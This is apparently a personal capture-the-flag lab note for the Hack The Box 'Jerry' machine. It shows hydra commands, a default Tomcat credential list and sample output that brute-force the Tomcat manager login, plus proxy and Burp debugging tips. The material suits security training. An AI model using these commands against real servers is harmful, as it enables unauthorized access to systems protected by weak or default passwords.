### 
```
hydra -C creds.txt http-get://10.10.10.95:8080/manager/html
hydra -U http-get
hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
```

# hydra Options:
```
-l LOGIN or -L FILE  login with LOGIN name, or load several logins from FILE
-p PASS  or -P FILE  try password PASS, or load several passwords from FILE
-C FILE   colon separated "login:pass" format, instead of -L/-P options

-U        service module usage details
```

### Username:Password
https://github.com/netbiosX/Default-Credentials/blob/master/Apache-Tomcat-Default-Passwords.mdown
Save as: labs/htb/_BeginnerTrack/Jerry/creds.txt
```
admin:password
admin:
... snip ...
tomcat:admin
tomcat:changethis
```

### Supported services
```
Supported services: adam6500 asterisk cisco cisco-enable cobaltstrike cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
```

### hydra -U http-get
```
$ hydra -U http-get
Help for module http-get:
============================================================================
Module http-get requires the page to authenticate.
The following parameters are optional:
 (a|A)=auth-type   specify authentication mechanism to use: BASIC, NTLM or MD5
 (h|H)=My-Hdr\: foo   to send a user defined HTTP header with each request
 (F|S)=check for text in the HTTP reply. S= means if this text is found, a
       valid account has been found, F= means if this string is present the
       combination is invalid. Note: this must be the last option supplied.
For example:  "/secret" or "http://bla.com/foo/bar:H=Cookie\: sessid=aaaa" or "https://test.com:8080/members:A=NTLM"
```

### Common Mistakes
login: admin   password: admin are not the right combination, see the help above
```
$ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html

[DATA] attacking http-get://10.10.10.95:8080/manager/html
[8080][http-get] host: 10.10.10.95   login: admin   password: admin
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 2 valid passwords found

```

### Now you got it right
```
$ hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'

[DATA] max 16 tasks per 1 server, overall 16 tasks, 25 login tries, ~2 tries per task
[DATA] attacking http-get://10.10.10.95:8080/manager/html:F=Access Denied
[8080][http-get] host: 10.10.10.95   login: tomcat   password: s3cret
1 of 1 target successfully completed, 1 valid password found

```

### Use HYDRA_PROXY_HTTP or HYDRA_PROXY environment variables for a proxy setup.
```
$ hydra -h
... [snip] ...
E.g. % export HYDRA_PROXY=socks5://l:p@127.0.0.1:9150 (or: socks4:// connect://)
     % export HYDRA_PROXY=connect_and_socks_proxylist.txt  (up to 64 entries)
     % export HYDRA_PROXY_HTTP=http://login:pass@proxy:8080
     % export HYDRA_PROXY_HTTP=proxylist.txt  (up to 64 entries)
... [snip] ...
```

### To debug, send Hydra output to Burp. Use this in the same line
```
HYDRA_PROXY_HTTP=http://localhost:8080 hydra -C creds.txt http-get://10.10.10.95:8080/manager/html:F='Access Denied'
```


### 
```

```

### 
```

```

### 
```

```

### 
```

```

### 
```

```

### 
```

```